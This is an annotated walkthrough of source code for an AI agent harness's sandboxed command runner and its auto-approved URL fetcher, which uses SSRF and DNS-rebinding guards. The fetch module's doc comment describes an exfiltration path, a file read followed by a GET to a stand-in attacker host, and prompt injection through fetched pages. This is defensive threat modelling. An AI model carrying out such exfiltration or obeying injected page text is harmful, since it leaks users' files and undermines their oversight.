struct CommandOutput

L21–L54

Everything the UI and the model need to know about a finished command. exit_code is Option because a signalled or timed-out process has no exit code at all.

Three separate booleans — truncated, timed_out, cancelled — rather than one status enum, because they are independent: a command can be cancelled after having already produced truncated output.

Serialize/Deserialize is here because this ends up inside app::Entry::CommandResult, which is persisted in the session file.

summary() produces the short header line the transcript shows — checked in priority order, since "cancelled" is more informative than the exit code that resulted from cancelling.

21 
22#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
23pub struct CommandOutput {
24 pub command: String,
25 /// `None` when the process was killed by a signal or timed out.
26 pub exit_code: Option<i32>,
27 pub stdout: String,
28 pub stderr: String,
29 pub truncated: bool,
30 pub timed_out: bool,
31 /// The user interrupted the command before it finished.
32 pub cancelled: bool,
33}
34 
35impl CommandOutput {
36 pub fn succeeded(&self) -> bool {
37 self.exit_code == Some(0)
38 }
39 
40 /// A short status line for the transcript header.
41 pub fn summary(&self) -> String {
42 if self.cancelled {
43 return "cancelled".to_string();
44 }
45 if self.timed_out {
46 return "timed out".to_string();
47 }
48 match self.exit_code {
49 Some(0) => "exit 0".to_string(),
50 Some(code) => format!("exit {code}"),
51 None => "killed".to_string(),
52 }
53 }
54}

struct WriteOutcome

L55–L98

The write equivalent. as_result() is the interesting method: it collapses the four failure flags into the Result<usize, &str> that protocol::encode_write_result wants, in a fixed precedence order.

Note that a failed edit also travels as a WriteOutcome — App::push_edit_failure constructs one by hand with bytes: 0. An edit executes as a write, so its failures are write failures, and reusing this type keeps one path for framing and display.

55 
56/// The outcome of a sandboxed file write.
57#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
58pub struct WriteOutcome {
59 pub path: String,
60 /// Bytes written on success.
61 pub bytes: usize,
62 /// Error message when the write failed (e.g. denied by the sandbox).
63 pub error: Option<String>,
64 pub timed_out: bool,
65 pub cancelled: bool,
66}
67 
68impl WriteOutcome {
69 pub fn succeeded(&self) -> bool {
70 self.error.is_none() && !self.timed_out && !self.cancelled
71 }
72 
73 /// Success/failure for the model-facing result.
74 pub fn as_result(&self) -> Result<usize, &str> {
75 if self.cancelled {
76 Err("cancelled")
77 } else if self.timed_out {
78 Err("timed out")
79 } else if let Some(error) = &self.error {
80 Err(error.as_str())
81 } else {
82 Ok(self.bytes)
83 }
84 }
85 
86 /// A short status line for the transcript header.
87 pub fn summary(&self) -> String {
88 if self.cancelled {
89 "cancelled".to_string()
90 } else if self.timed_out {
91 "timed out".to_string()
92 } else if self.error.is_some() {
93 "failed".to_string()
94 } else {
95 format!("wrote {} bytes", self.bytes)
96 }
97 }
98}

async fn run — the uncancellable wrapper

L99–L107

std::future::pending() is a future that never resolves, so passing it as cancel means "no cancellation" without needing a second code path. Neat, and it means the test suite exercises the same function the app does.

99 
100/// Run `script` inside `sandbox`, giving up after `timeout`, with no
101/// cancellation. The app uses [`run_cancellable`]; this convenience wrapper is
102/// exercised by the test suite.
103#[cfg_attr(not(test), allow(dead_code))]
104pub async fn run(sandbox: &Sandbox, script: &str, timeout: Duration) -> Result<CommandOutput> {
105 // No cancellation: a future that never resolves.
106 run_cancellable(sandbox, script, timeout, std::future::pending()).await
107}

run_cancellable — spawning

L108–L137

The setup, and every line is a guarantee.

stdin(Stdio::null()) — an interactive command gets EOF and exits rather than blocking for input nobody will ever type.

kill_on_drop(true) — if this future is dropped, tokio kills the child. Backstop for paths that do not reach an explicit kill.

process_group(0) is the important one. It puts the child in a new process group whose id is its pid, which is what makes the negative-pid kill in kill_group reach the whole tree. Without it, Child::kill would reap only the sh we spawned and leave whatever it started running.

108 
109/// Like [`run`], but `cancel` resolving interrupts the command. On cancel the
110/// process group is killed — reusing the same clean teardown as the timeout, so
111/// grandchildren are reaped rather than orphaned.
112pub async fn run_cancellable(
113 sandbox: &Sandbox,
114 script: &str,
115 timeout: Duration,
116 cancel: impl std::future::Future<Output = ()>,
117) -> Result<CommandOutput> {
118 let mut command = sandbox.command(script);
119 command
120 .stdin(Stdio::null())
121 .stdout(Stdio::piped())
122 .stderr(Stdio::piped())
123 .kill_on_drop(true);
124 
125 // Its own process group, so a timeout or cancel can take down grandchildren
126 // too. `Child::kill` would only reap the `sh` we spawned directly.
127 #[cfg(unix)]
128 command.process_group(0);
129 
130 let mut child = command
131 .spawn()
132 .with_context(|| format!("spawning sandboxed command: {script}"))?;
133 let pid = child.id();
134 
135 let mut stdout_pipe = child.stdout.take().expect("stdout piped");
136 let mut stderr_pipe = child.stderr.take().expect("stderr piped");
137 

run_cancellable — drain, race, kill

L138–L194

The collect future is not optional. A pipe holds ~64 KB; once it fills, the child blocks on write forever. If we waited on the child before reading its pipes, any command producing more than a pipe buffer would deadlock and only ever surface as a timeout. So both pipes are drained concurrently (tokio::join!) and then the child is waited on.

The select! races cancellation against timeout(timeout, collect), giving three outcomes:

  • Cancelled — kill the group, return with cancelled: true and no output (it was interrupted; partial output would mislead).
  • Finished — assemble the real result. from_utf8_lossy means binary output becomes replacement characters rather than an error.
  • Timed out — kill the group, return timed_out: true with a stderr message naming the limit.

Both failure paths call kill_group, which is the shared clean teardown the README refers to.

138 // Drain both pipes while waiting. Without this a command producing more than
139 // a pipe buffer of output would block forever and only surface as a timeout.
140 let collect = async {
141 let mut out = Vec::new();
142 let mut err = Vec::new();
143 let (a, b) = tokio::join!(
144 read_capped(&mut stdout_pipe, &mut out),
145 read_capped(&mut stderr_pipe, &mut err),
146 );
147 let status = child.wait().await;
148 (out, err, a, b, status)
149 };
150 
151 tokio::pin!(cancel);
152 tokio::select! {
153 // The user interrupted before the command finished.
154 _ = &mut cancel => {
155 kill_group(pid);
156 Ok(CommandOutput {
157 command: script.to_string(),
158 exit_code: None,
159 stdout: String::new(),
160 stderr: "command cancelled".to_string(),
161 truncated: false,
162 timed_out: false,
163 cancelled: true,
164 })
165 }
166 result = tokio::time::timeout(timeout, collect) => match result {
167 Ok((out, err, a, b, status)) => {
168 let truncated = a.context("reading stdout")? || b.context("reading stderr")?;
169 let status = status.context("waiting for sandboxed command")?;
170 Ok(CommandOutput {
171 command: script.to_string(),
172 exit_code: status.code(),
173 stdout: String::from_utf8_lossy(&out).into_owned(),
174 stderr: String::from_utf8_lossy(&err).into_owned(),
175 truncated,
176 timed_out: false,
177 cancelled: false,
178 })
179 }
180 Err(_) => {
181 kill_group(pid);
182 Ok(CommandOutput {
183 command: script.to_string(),
184 exit_code: None,
185 stdout: String::new(),
186 stderr: format!("command exceeded the {}s timeout", timeout.as_secs()),
187 truncated: false,
188 timed_out: true,
189 cancelled: false,
190 })
191 }
192 }
193 }
194}

async fn write_file — tee under the sandbox

L195–L242

A file write is done by running /usr/bin/tee under the sandbox with the contents piped to its stdin. That sounds indirect; the reason is in the doc comment.

Why not std::fs::write: writing in-process would bypass Seatbelt entirely, so the confinement would have to be re-derived in Rust — exactly the "check the path yourself" approach this codebase rejects elsewhere. Driving tee through sandbox.program() means the kernel decides whether the write is allowed, and a path outside the root comes back as a denial rather than an escape.

The path is passed as an argv element, never as shell text, so it cannot inject. -- before it stops a path beginning with - from being read as a flag.

mkdir -p runs first, also sandboxed, so it cannot create anything outside the root either. The outcome closure at the top exists so every return path builds a consistent WriteOutcome.

195 
196/// Write `contents` to `path` under the sandbox.
197///
198/// The write is driven with `tee` via argv (no shell), so the path cannot inject,
199/// and Seatbelt confines it to the working directory regardless of the path — a
200/// write outside the root comes back as an error, never an escape. The parent
201/// directory is created first (also sandboxed).
202pub async fn write_file(
203 sandbox: &Sandbox,
204 path: &str,
205 contents: &str,
206 timeout: Duration,
207 cancel: impl std::future::Future<Output = ()>,
208) -> Result<WriteOutcome> {
209 let outcome = |error: Option<String>| WriteOutcome {
210 path: path.to_string(),
211 bytes: if error.is_none() { contents.len() } else { 0 },
212 error,
213 timed_out: false,
214 cancelled: false,
215 };
216 
217 // Create the parent directory if the path has one. `mkdir -p` is idempotent
218 // and, being sandboxed, cannot create anything outside the root.
219 if let Some(parent) = std::path::Path::new(path).parent() {
220 let parent = parent.to_string_lossy();
221 if !parent.is_empty() && parent != "." {
222 let mkdir = sandbox.program("/bin/mkdir", &["-p", "--", &parent]);
223 if let Err(e) = run_program(mkdir, None).await? {
224 return Ok(outcome(Some(format!("could not create {parent}: {e}"))));
225 }
226 }
227 }
228 
229 // `tee` writes stdin to the file; its stdout echo is discarded.
230 let tee = sandbox.program("/usr/bin/tee", &["--", path]);
231 tokio::pin!(cancel);
232 tokio::select! {
233 _ = &mut cancel => Ok(WriteOutcome { cancelled: true, ..outcome(None) }),
234 result = tokio::time::timeout(timeout, run_program(tee, Some(contents))) => match result {
235 Ok(run) => match run? {
236 Ok(()) => Ok(outcome(None)),
237 Err(stderr) => Ok(outcome(Some(stderr))),
238 },
239 Err(_) => Ok(WriteOutcome { timed_out: true, ..outcome(None) }),
240 },
241 }
242}

async fn run_program — spawn, feed, wait

L243–L295

The shared plumbing behind both mkdir and tee. Return type Result<Result<(), String>> is a real distinction, not clumsiness: the outer error means "could not spawn at all", the inner means "ran and failed", and only the latter is worth reporting to the model as a write failure.

Closing stdin (pipe.shutdown()) after writing is required — tee copies until EOF, so without the explicit close it would wait forever and hit the timeout.

The stderr fallback at the end matters in practice: a Seatbelt denial often produces an empty stderr, so exited with {status} is what the user actually sees in that case.

243 
244/// Spawn a sandboxed program, optionally feeding `stdin`, and wait for it.
245/// Returns `Ok(())` on a clean exit, or `Err(stderr-or-status)` otherwise.
246async fn run_program(
247 mut command: tokio::process::Command,
248 stdin: Option<&str>,
249) -> Result<std::result::Result<(), String>> {
250 use tokio::io::AsyncWriteExt;
251 
252 command
253 .stdin(if stdin.is_some() {
254 Stdio::piped()
255 } else {
256 Stdio::null()
257 })
258 .stdout(Stdio::null())
259 .stderr(Stdio::piped())
260 .kill_on_drop(true);
261 #[cfg(unix)]
262 command.process_group(0);
263 
264 let mut child = command.spawn().context("spawning sandboxed program")?;
265 
266 if let Some(bytes) = stdin {
267 // Write and close stdin so `tee` sees EOF. A dropped pipe (child already
268 // gone) is not fatal — the exit status below is what matters.
269 if let Some(mut pipe) = child.stdin.take() {
270 let _ = pipe.write_all(bytes.as_bytes()).await;
271 let _ = pipe.shutdown().await;
272 }
273 }
274 
275 let mut stderr = Vec::new();
276 if let Some(mut pipe) = child.stderr.take() {
277 let _ = pipe.read_to_end(&mut stderr).await;
278 }
279 let status = child
280 .wait()
281 .await
282 .context("waiting for sandboxed program")?;
283 
284 if status.success() {
285 Ok(Ok(()))
286 } else {
287 let message = String::from_utf8_lossy(&stderr).trim().to_string();
288 let message = if message.is_empty() {
289 format!("exited with {status}")
290 } else {
291 message
292 };
293 Ok(Err(message))
294 }
295}

async fn read_capped

L296–L323

Reads to EOF, storing at most MAX_STREAM_BYTES and returning whether anything was dropped.

Why it keeps reading after the cap: stopping would leave the pipe full and the child blocked on write — the deadlock this function exists to avoid. So past the cap it keeps draining and discards the excess; the command runs to completion, it just stops being recorded.
296 
297/// Read until EOF or the cap. Returns whether output was truncated.
298///
299/// Reading continues past the cap and discards the excess, so the child never
300/// blocks on a full pipe — it just stops being recorded.
301async fn read_capped<R>(reader: &mut R, sink: &mut Vec<u8>) -> Result<bool>
302where
303 R: AsyncReadExt + Unpin,
304{
305 let mut buffer = [0u8; 8192];
306 let mut truncated = false;
307 loop {
308 let n = reader.read(&mut buffer).await?;
309 if n == 0 {
310 return Ok(truncated);
311 }
312 if sink.len() < MAX_STREAM_BYTES {
313 let room = MAX_STREAM_BYTES - sink.len();
314 let take = room.min(n);
315 sink.extend_from_slice(&buffer[..take]);
316 if take < n {
317 truncated = true;
318 }
319 } else {
320 truncated = true;
321 }
322 }
323}

fn kill_group

L324–L335

libc::kill(-pid, SIGKILL). The negative pid is the whole trick: on Unix it targets the process group whose id is pid, which is exactly the group created by process_group(0) above. That is how a timeout takes down a command's grandchildren.

SIGKILL rather than SIGTERM: the command has already exceeded its bounds or been interrupted, and a graceful shutdown it could ignore is not what is wanted.

The #[cfg(not(unix))] stub keeps the code compiling elsewhere — though Sandbox::new refuses to start on non-macOS anyway.

324 
325/// Kill the child's whole process group.
326#[cfg(unix)]
327fn kill_group(pid: Option<u32>) {
328 if let Some(pid) = pid {
329 // Negative pid targets the process group created via `process_group(0)`.
330 unsafe { libc::kill(-(pid as i32), libc::SIGKILL) };
331 }
332}
333 
334#[cfg(not(unix))]
335fn kill_group(_pid: Option<u32>) {}

What the tests cover

~320 lines, gated on macOS since they need a real Seatbelt sandbox. They run actual commands and check the guarantees end to end: a write inside the root succeeds and one outside is denied by the kernel; sleep 60 hits the timeout and its process group is gone afterwards; a command emitting more than 32 KB comes back truncated; a command reading .env is denied.

fetch.rs

1021 lines of code · 700 lines of tests

Vets, fetches, and flattens a URL for <ai-harness-fetch> — destination policy, a guarded DNS resolver, and HTML to text.

uses reqwest, url

used by app, main, protocol

This file is what makes <ai-harness-fetch> safe enough to run without asking you first — and it is worth reading with files.rs in mind, because the two elements are auto-approved for different reasons.

files.rs earns its exemption by being more confined than the shell. This file cannot: a fetch is an outbound request to a host the model picked, and there is no root to check it against. What stands in for the root is a policy on the destination — https only, and nothing that belongs to this machine or this network.

The single most important idea here is that the address check is installed as reqwest's own DNS resolver rather than run beforehand. Anything else leaves a rebinding race, because the client resolves again when it connects, and a redirect resolves a fresh host. That one decision is what the rest of the transport is arranged around.

The file has three parts, and they are independently testable on purpose: the rules (pure, no I/O), the transport (the only part that opens a socket), and the HTML-to-text extractor (pure again). Roughly two thirds of it is the first and third.

module doc and the four caps

L1–L53

The module doc is the argument for the whole element, and it is written to be read next to files.rs — because the obvious reading is wrong.

A read is auto-approved because it is confined harder than the shell: one concrete path, resolved inside the working directory. It is tempting to say a fetch is auto-approved for the same reason. It is not. A fetch cannot be confined that way at all — it is an outbound request to a host the model chose, and there is no root to check it against.

What replaces the root: a policy on the destination. https only, and no address that belongs to this machine or this network. That is a genuinely weaker claim than the read's, so the doc says so, and then says exactly what it does not buy — the two numbered caveats are the honest part of the file.

Caveat 1 is the one worth sitting with. Auto-approved read plus auto-approved fetch is a complete exfiltration path: read a file, then GET https://attacker.example/?d=…, with nobody asked. The address rules do nothing about it, because the attacker's host is an ordinary public one. --confirm-fetch exists for people who would rather not.

The four caps: 256 KB of raw body, 64 KB of extracted text (the same as a file read — the context budget does not care where text came from), 3 redirect hops, and 2 KB of URL.

1//! Fetching a URL for `<ai-harness-fetch>`.
2//!
3//! Like [`crate::files`], this runs without the approval modal, and for the same
4//! reason: an agent that wants to read three documentation pages before doing
5//! anything should not interrupt the user three times first. But the safety
6//! argument is *not* the same one, and it is worth being exact about that.
7//!
8//! A read earns auto-approval by being confined more tightly than the shell —
9//! it resolves inside the working directory or it fails. A fetch cannot be
10//! confined that way: it is an outbound request to a host the model chose. What
11//! bounds it instead is a policy applied to the destination:
12//!
13//! - `https` only, so a fetch cannot reach `file://` or downgrade to plaintext.
14//! - Loopback, private, link-local, and other special-purpose addresses are
15//! refused, so a fetch cannot reach the user's own machine, their LAN, or a
16//! cloud metadata endpoint. This is checked on the address actually connected
17//! to, not on a separate lookup — see [`GuardedResolver`].
18//! - The body is capped, the request is bounded by a timeout, and redirects are
19//! limited and re-checked at every hop.
20//!
21//! Two things this deliberately does *not* do, both documented in the README:
22//!
23//! 1. It does not stop exfiltration. An auto-approved read followed by an
24//! auto-approved fetch of `https://attacker.example/?d=…` moves file contents
25//! off the machine with no user interaction. The address rules do not help:
26//! the attacker's host is an ordinary public one. `--confirm-fetch` puts the
27//! modal back for users who do not want that.
28//! 2. It does not bound what a fetched page *says*. Page text lands in the
29//! model's context as data, and a page may try to instruct the model. What
30//! contains that is structural: shell, write, and edit still require
31//! approval, so a page can persuade the model to propose something but not
32//! to do it.
33 
34use std::future::Future;
35use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};
36use std::time::Duration;
37 
38use anyhow::{Context, Result};
39use futures_util::StreamExt;
40use serde::{Deserialize, Serialize};
41use url::{Host, Url};
42 
43/// Cap on the raw response body. Generous next to [`MAX_TEXT_BYTES`] because
44/// HTML shrinks a long way once the markup is gone.
45pub const MAX_FETCH_BYTES: usize = 256 * 1024;
46/// Cap on the extracted text handed to the model. Matches the file-read cap:
47/// the context budget does not care where the text came from.
48pub const MAX_TEXT_BYTES: usize = 64 * 1024;
49/// Redirect hops allowed. Low on purpose — a documentation link needs one or
50/// two, and a long chain is more often a redirector being used as a launder.
51pub const MAX_REDIRECTS: usize = 3;
52/// Cap on the URL itself, before anything tries to parse it.
53pub const MAX_URL_BYTES: usize = 2048;

const TEXTUAL_TYPES

L54–L67

The allowlist of content types worth handing to a language model. Anything else is refused with a message rather than decoded as mojibake and spent — the same call files::read makes when it sees a NUL byte.

"+json" is in the list to catch the suffix conventions (application/vnd.api+json and friends).

54 
55/// Content types worth handing to a language model. Everything else is refused
56/// rather than dumped into the context as mojibake, the same call
57/// [`crate::files::read`] makes about binary files.
58const TEXTUAL_TYPES: [&str; 8] = [
59 "text/",
60 "application/json",
61 "application/xml",
62 "application/xhtml",
63 "application/javascript",
64 "application/yaml",
65 "application/toml",
66 "+json",
67];

struct FetchOutcome

L68–L91

The same shape as ReadOutcome and WriteOutcome, and for the same reason: a failure is data to hand back to the model, not an error that ends the turn. A refused URL costs one round-trip and the model tries something else.

url is stored as the model wrote it. final_url is set only when redirects moved the request — worth carrying separately, because nobody approved this request and where it actually landed is information the transcript should show.

68 
69// ---------------------------------------------------------------------------
70// Outcome
71// ---------------------------------------------------------------------------
72 
73/// The result of a fetch, successful or not.
74///
75/// Failure is data, not an error: a refused or broken fetch goes back to the
76/// model so it can try something else, exactly like [`crate::files::ReadOutcome`].
77/// Only a failure to *start* the work surfaces as an `Err` to the caller.
78#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
79pub struct FetchOutcome {
80 /// The URL as the model wrote it, for display and for the result message.
81 pub url: String,
82 /// Where the request actually landed, when redirects moved it.
83 pub final_url: Option<String>,
84 pub status: Option<u16>,
85 pub content_type: Option<String>,
86 pub text: String,
87 /// Size of the raw body received, before extraction.
88 pub bytes: usize,
89 pub truncated: bool,
90 pub error: Option<String>,
91}

impl FetchOutcome

L92–L123

failed() is the constructor every refusal path funnels into; summary() is the transcript header line. Both mirror ReadOutcome deliberately, so the two results render the same way.

92 
93impl FetchOutcome {
94 pub fn failed(url: &str, error: impl Into<String>) -> Self {
95 Self {
96 url: url.to_string(),
97 final_url: None,
98 status: None,
99 content_type: None,
100 text: String::new(),
101 bytes: 0,
102 truncated: false,
103 error: Some(error.into()),
104 }
105 }
106 
107 pub fn succeeded(&self) -> bool {
108 self.error.is_none()
109 }
110 
111 /// One-line header for the transcript.
112 pub fn summary(&self) -> String {
113 if self.error.is_some() {
114 return "failed".to_string();
115 }
116 let lines = self.text.lines().count();
117 if self.truncated {
118 format!("{lines} line(s), truncated")
119 } else {
120 format!("{lines} line(s), {} bytes", self.text.len())
121 }
122 }

enum BlockReason

L124–L161

Why an address was refused, kept as a value rather than a string so the address table can stay a set of small total functions and the wording lives in one place.

It is also what makes the error message useful: "169.254.169.254 is a link-local address" tells the model something it can act on, where "blocked" would not.

129/// Why an address is not an acceptable destination.

131pub enum BlockReason {

138 Broadcast,
139 Documentation,
140 Shared,
141 Benchmarking,
142 Reserved,
143}

enum Rejection and its message

L162–L219

Every way a fetch can fail to produce text, structured rather than stringly-typed — the same choice ProtocolError makes, and for the same payoff: tests assert on the variant, and the wording is rendered in exactly one place.

Notice the scheme message names the alternative: "to reach anything else, use a shell command, which the user will be asked to approve". A refusal that does not say what would work instead just invites the model to retry the same thing.

162 
163/// Why a fetch did not happen, or did not produce usable text.
164///
165/// Structured rather than stringly-typed for the same reason as
166/// [`crate::protocol::ProtocolError`]: tests assert on the variant, and the
167/// message is rendered in one place.
168#[derive(Debug, Clone, PartialEq, Eq)]
169pub enum Rejection {
170 Empty,
171 TooLong { bytes: usize },
172 NotAUrl { reason: String },
173 BadScheme { scheme: String },
174 CredentialsInUrl,
175 NoHost,
176 Blocked { host: String, reason: BlockReason },
177 TooManyRedirects { limit: usize },
178 BadStatus { status: u16 },
179 UnsupportedContentType { content_type: String },
180 Timeout { seconds: u64 },
181 Cancelled,
182 Transport { message: String },
183}
184 
185impl Rejection {
186 pub fn message(&self) -> String {
187 match self {
188 Self::Empty => "no URL was given".to_string(),
189 Self::TooLong { bytes } => {
190 format!("the URL is {bytes} bytes; the limit is {MAX_URL_BYTES}")
191 }
192 Self::NotAUrl { reason } => format!("not a valid URL: {reason}"),
193 Self::BadScheme { scheme } => format!(
194 "{scheme}: is not allowed; fetch speaks https only. \
195 To reach anything else, use a shell command, which the user will be asked to approve."
196 ),
197 Self::CredentialsInUrl => {
198 "the URL carries credentials (user:password@), which are not sent".to_string()
199 }
200 Self::NoHost => "the URL has no host".to_string(),
201 Self::Blocked { host, reason } => format!(
202 "{host} is {}; fetch reaches public hosts only, so it cannot be used \
203 to probe the local machine or network",
204 reason.as_str()
205 ),
206 Self::TooManyRedirects { limit } => {
207 format!("the URL redirected more than {limit} times")
208 }
209 Self::BadStatus { status } => format!("the server returned HTTP {status}"),
210 Self::UnsupportedContentType { content_type } => format!(
211 "the response is {content_type}, which is not text; \
212 fetch returns textual content only"
213 ),
214 Self::Timeout { seconds } => format!("the request exceeded the {seconds}s timeout"),
215 Self::Cancelled => "the fetch was cancelled".to_string(),
216 Self::Transport { message } => message.clone(),
217 }
218 }
219}

fn check_ip — canonicalise first

L220–L236

Three lines, and the order is the whole point. to_canonical() runs before the tables, so an IPv4-mapped form like ::ffff:169.254.169.254 is judged by the v4 rules instead of sliding past the v6 ones untouched.

Why this is not paranoia: the mapped form is a perfectly ordinary way to write a v4 address in a v6 world. Without the fold, every rule below is one spelling away from being bypassed.
220 
221// ---------------------------------------------------------------------------
222// Address policy
223// ---------------------------------------------------------------------------
224 
225/// Refuse any address that is not a plausible public destination.
226///
227/// [`IpAddr::to_canonical`] runs first so an IPv4-mapped form such as
228/// `::ffff:169.254.169.254` is judged by the v4 table rather than sliding past
229/// the v6 one.
230pub fn check_ip(ip: IpAddr) -> Result<(), BlockReason> {
231 match ip.to_canonical() {
232 IpAddr::V4(v4) => check_ipv4(v4),
233 IpAddr::V6(v6) => check_ipv6(v6),
234 }
235}
236 

fn check_ipv4 — the IANA ranges

L237–L283

Ipv4Addr::is_global would be this whole function in one call, but it is still unstable, so the ranges it covers are spelled out. The stable predicates carry most of it — is_private is exactly 10/8, 172.16/12 and 192.168/16, and is_link_local is 169.254/16, which is where cloud metadata lives. The mask checks at the bottom cover what has no predicate: carrier-grade NAT, benchmarking, protocol assignments, and reserved space.

The trap the doc comment calls out: these predicates live on Ipv4Addr, not on the IpAddr enum. The enum has is_loopback but no is_private and no is_link_local. Code that calls ip.is_loopback() on an IpAddr and assumes the private ranges came along compiles fine and silently lets 10.0.0.1 through. Matching the variant is what forces the full table.

0.0.0.0/8 is refused whole, not just 0.0.0.0 — it is also where a deprecated IPv4-compatible v6 address collapses to.

237/// The IANA special-purpose ranges, in the order a reader would check them.
238///
239/// `Ipv4Addr::is_global` would express this in one call but is still unstable,
240/// so the ranges it covers are spelled out. Note these predicates live on
241/// `Ipv4Addr`, not on `IpAddr` — calling `is_loopback` through the enum compiles
242/// but silently skips `is_private` and `is_link_local`.
243fn check_ipv4(ip: Ipv4Addr) -> Result<(), BlockReason> {
244 let bits = ip.to_bits();
245 // 0.0.0.0/8, "this network". Also catches the 0.0.0.1 that a deprecated
246 // IPv4-compatible IPv6 address collapses to.
247 if ip.octets()[0] == 0 {
248 return Err(BlockReason::Unspecified);
249 }
250 if ip.is_loopback() {
251 return Err(BlockReason::Loopback);
252 }
253 if ip.is_private() {
254 return Err(BlockReason::Private);
255 }
256 if ip.is_link_local() {
257 // 169.254.0.0/16, which is where cloud metadata lives.
258 return Err(BlockReason::LinkLocal);
259 }
260 if ip.is_broadcast() {
261 return Err(BlockReason::Broadcast);
262 }
263 if ip.is_documentation() {
264 return Err(BlockReason::Documentation);
265 }
266 if ip.is_multicast() {
267 return Err(BlockReason::Multicast);
268 }
269 if bits & 0xffc0_0000 == 0x6440_0000 {
270 // 100.64.0.0/10, carrier-grade NAT.
271 return Err(BlockReason::Shared);
272 }
273 if bits & 0xfffe_0000 == 0xc612_0000 {
274 // 198.18.0.0/15, benchmarking.
275 return Err(BlockReason::Benchmarking);
276 }
277 if bits & 0xffff_ff00 == 0xc000_0000 || bits & 0xf000_0000 == 0xf000_0000 {
278 // 192.0.0.0/24 (IETF protocol assignments) and 240.0.0.0/4 (reserved).
279 return Err(BlockReason::Reserved);
280 }
281 Ok(())
282}
283 

fn check_ipv6 — deny by default

L284–L329

The v4 side has to enumerate, because v4 special ranges are scattered. The v6 side does not, and this function takes the better option: only global unicast (2000::/3) is a candidate at all.

Why that is the right direction: an enumerated denylist fails open on anything nobody thought of. This check fails closed — a v6 range invented next year is refused without anyone editing this file. It also subsumes loopback, unique-local, link-local and multicast in one comparison; the explicit predicates above it are kept only because each carries a specific reason into the error message.

The last two cases unwrap addresses that embed a v4 one: 6to4 (2002::/16) and NAT64 (64:ff9b::/96). Both can carry a private v4 address inside a v6 wrapper, so the embedded address is what gets judged.

284/// Deny by default: only global unicast (`2000::/3`) is a candidate at all.
285///
286/// This is the fail-closed direction — an address class nobody thought of is
287/// refused rather than allowed — and it subsumes loopback, unique-local,
288/// link-local, and multicast in one check. The explicit predicates below it
289/// are kept for the specific reason each carries into the error message.
290fn check_ipv6(ip: Ipv6Addr) -> Result<(), BlockReason> {
291 if ip.is_unspecified() {
292 return Err(BlockReason::Unspecified);
293 }
294 if ip.is_loopback() {
295 return Err(BlockReason::Loopback);
296 }
297 if ip.is_unique_local() {
298 return Err(BlockReason::UniqueLocal);
299 }
300 if ip.is_unicast_link_local() {
301 return Err(BlockReason::LinkLocal);
302 }
303 if ip.is_multicast() {
304 return Err(BlockReason::Multicast);
305 }
306 let segments = ip.segments();
307 if segments[0] & 0xe000 != 0x2000 {
308 return Err(BlockReason::Reserved);
309 }
310 if segments[0] == 0x2001 && segments[1] == 0x0db8 {
311 return Err(BlockReason::Documentation);
312 }
313 if segments[0] == 0x2001 && segments[1] == 0x0002 {
314 return Err(BlockReason::Benchmarking);
315 }
316 // 6to4 (2002::/16) and NAT64 (64:ff9b::/96) embed a v4 address that may
317 // itself be private, so judge the address they actually reach. NAT64 sits
318 // outside 2000::/3 and is already refused above; it is handled here so the
319 // intent survives if that check is ever loosened.
320 if segments[0] == 0x2002 {
321 let embedded = Ipv4Addr::from(((segments[1] as u32) << 16) | segments[2] as u32);
322 return check_ipv4(embedded);
323 }
324 if segments[0] == 0x0064 && segments[1] == 0xff9b && segments[2..6] == [0, 0, 0, 0] {
325 let embedded = Ipv4Addr::from(((segments[6] as u32) << 16) | segments[7] as u32);
326 return check_ipv4(embedded);
327 }
328 Ok(())
329}

struct Policy — and the test seam

L330–L373

Two booleans exist so the transport tests can reach a server on http://127.0.0.1, which the real rules refuse by design. That is a hole if it is done carelessly, so it is fenced three ways.

Why this beats a #[cfg(test)] exception buried in check_ip: the loosening is two named booleans you can grep for, permissive_for_tests does not exist in a shipping build, and the URL and address tests run against strict — never the loosened one. A test asserts strict() really has both flags set the safe way, so the seam cannot quietly drift open.
330 
331// ---------------------------------------------------------------------------
332// URL policy
333// ---------------------------------------------------------------------------
334 
335/// What a [`Fetcher`] is allowed to do.
336///
337/// The two booleans exist so tests can reach a local server; production never
338/// constructs anything but [`Policy::strict`], and [`crate::fetch::fetch`] takes
339/// no policy argument at all.
340#[derive(Debug, Clone, Copy)]
341pub struct Policy {
342 pub require_https: bool,
343 pub allow_private_ips: bool,
344 pub max_bytes: usize,
345 pub max_redirects: usize,
346 pub timeout: Duration,
347}
348 
349impl Policy {
350 pub fn strict(timeout: Duration) -> Self {
351 Self {
352 require_https: true,
353 allow_private_ips: false,
354 max_bytes: MAX_FETCH_BYTES,
355 max_redirects: MAX_REDIRECTS,
356 timeout,
357 }
358 }
359 
360 /// Loosened so the test server on `http://127.0.0.1:…` is reachable.
361 ///
362 /// `#[cfg(test)]`, so it does not exist in a shipping build. The URL and
363 /// address rules themselves are tested against [`Policy::strict`] — this
364 /// only exists to exercise the transport around them.
365 #[cfg(test)]
366 pub fn permissive_for_tests(timeout: Duration) -> Self {
367 Self {
368 require_https: false,
369 allow_private_ips: true,
370 ..Self::strict(timeout)
371 }
372 }
373}

fn check_url — cheapest checks first

L374–L392

Trim, length, parse, then hand off. Bounding the URL at 2 KB before parsing keeps a pathological string from reaching the parser at all.

374 
375/// Parse and vet a URL the model supplied. Cheapest checks first.
376pub fn check_url(raw: &str, policy: &Policy) -> Result<Url, Rejection> {
377 let trimmed = raw.trim();
378 if trimmed.is_empty() {
379 return Err(Rejection::Empty);
380 }
381 if trimmed.len() > MAX_URL_BYTES {
382 return Err(Rejection::TooLong {
383 bytes: trimmed.len(),
384 });
385 }
386 let url = Url::parse(trimmed).map_err(|e| Rejection::NotAUrl {
387 reason: e.to_string(),
388 })?;
389 check_parsed_url(&url, policy)?;
390 Ok(url)
391}
392 

fn check_parsed_url — the half a redirect re-runs

L393–L426

Split out from check_url for one reason: the redirect policy gets a &Url, not a string, and every hop has to be re-checked with the same rules as the first.

Credentials are refused rather than stripped — user:pass@host leaks into logs and is also a classic display-confusion trick, where the part that looks like the host is really the username.

Why a literal-IP host is checked here but a name is not: a literal address never reaches the resolver, so this is its only chance. A name is deliberately left alone, because checking it here would be checking the wrong thing — see GuardedResolver below. Note the url crate has already normalised the obfuscated spellings: https://2130706433/ and https://0x7f.0.0.1/ both arrive as 127.0.0.1 before this code sees them.
393/// The half of [`check_url`] that a redirect hop can be re-checked against.
